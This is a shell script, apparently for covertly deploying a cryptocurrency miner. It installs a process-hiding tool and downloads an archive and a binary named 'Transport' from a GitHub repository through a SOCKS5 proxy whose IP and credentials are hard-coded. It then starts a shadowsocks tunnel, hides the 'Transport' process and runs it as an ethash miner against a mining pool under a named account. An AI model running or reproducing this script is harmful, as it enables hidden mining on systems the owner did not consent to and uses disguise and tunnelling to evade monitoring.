apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 129.158.58.77:1080
socks5_username = Archer
socks5_password = 12322
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
chmod +x Transport

apt -y install shadowsocks-libev rng-tools

ss-local -s 129.158.58.77 -p 8388 -l 9999 -k 1rN14HAmV -m chacha20-ietf-poly1305 -v &

ph add Transport

sudo ./Transport -a ethash -o stratum+tcp://ethash.kupool.com:1800 -u hunterd.001 -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
